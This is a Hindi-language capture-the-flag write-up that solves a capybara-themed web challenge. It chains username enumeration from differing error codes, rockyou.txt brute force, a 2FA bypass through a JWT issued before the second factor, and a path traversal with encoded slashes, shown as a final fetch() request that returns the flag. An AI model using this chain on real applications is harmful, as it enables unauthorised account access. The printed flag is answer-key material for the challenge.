## चरण 1: जानकारी एकत्र करना और User Enumeration

मुख्य पेज खोलते हैं। लॉगिन फ़ॉर्म दिखता है। रैंडम डेटा डालने की कोशिश करते हैं।
test:test → रिस्पॉन्स: 404 उपयोगकर्ता बाड़े में नहीं मिला।
admin:admin → रिस्पॉन्स: 404 उपयोगकर्ता बाड़े में नहीं मिला।

यह क्लासिक User Enumeration भेद्यता है। सर्वर बताता है कि उपयोगकर्ता मौजूद है या नहीं। rockyou.txt से सूची से ब्रूट-फ़ोर्स शुरू करते हैं। काफ़ी जल्दी नाम angel मिलता है।
angel:test → रिस्पॉन्स: 401 कैपीबारा के लिए गलत पासवर्ड।

उपयोगकर्ता angel मौजूद है!

## चरण 2: पासवर्ड brute-force

अब angel के लिए उसी rockyou.txt सूची से पासवर्ड ब्रूट-फ़ोर्स। सही पासवर्ड मिलता है: princess।

## चरण 3: 2FA बायपास (JWT Leak)

सही डेटा दर्ज करने पर /2fa पेज पर भेजा जाता है। 6-अंकीय कोड माँगता है। लेकिन Network (डेवलपर टूल्स) में /login अनुरोध देखें तो, सर्वर ने JSON लौटाया:
{
  "token": "eyJhbGciOiJIUzI1NiI...",
  "user_id": "679202372644",
  "redirect": "/2fa"
}
सर्वर ने 2FA पास करने से पहले ही JWT टोकन दे दिया। यह लॉजिक गलती है (2FA Bypass)। इस टोकन से API में पहले से ऑथराइज़ किया जा सकता है।

## चरण 4: API विश्लेषण और Path Traversal

2FA पेज पर कंसोल (F12) खोलते हैं। लॉग दिखता है: [API] अकाउंट प्रबंधन का आंतरिक एंडपॉइंट: POST /admin/account/679202372644

अगर अपने टोकन से इस एंडपॉइंट पर अनुरोध करें:
getAccountData('679202372644')
रिस्पॉन्स: फ़्लैग का अधिकार नहीं, फ़्लैग 239716013 में।

सीधे प्रयास:
getAccountData('239716013')
403 एक्सेस एरर। सर्वर जाँचता है कि URL में ID टोकन की ID से मिलती है।

लेकिन API हैंडल path पैरामीटर उपयोग करता है जो डायरेक्टरी ट्रैवर्सल कैरेक्टर फ़िल्टर नहीं करता। Path Traversal से पथ में अपनी ID (जाँच पास करने के लिए) और लक्ष्य ID दोनों रख सकते हैं।

## चरण 5: फ़्लैग प्राप्त करना

ऐसा अनुरोध बनाते हैं: /admin/account/679202372644/../239716013। सर्वर कोड में प्रोसेस से पहले डॉट्स को «न सिकोड़ने» के लिए स्लैश का URL-एन्कोडिंग (%2f) उपयोग करते हैं।

ब्राउज़र कंसोल में अंतिम अनुरोध:
fetch('/admin/account/679202372644%2f..%2f239716013', {
    method: 'POST',
    headers: {
        'Authorization': 'Bearer ' + localStorage.getItem('jwt'),
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ action: 'fetch_secure_data' })
}).then(res => res.json()).then(console.log);

परिणाम: {"status": "success", "owner": "मुख्य कैपीबारा", "data": "KubSTU{c4pyb4r4_p4th_tr4v3rs4l_m4st3r}"}
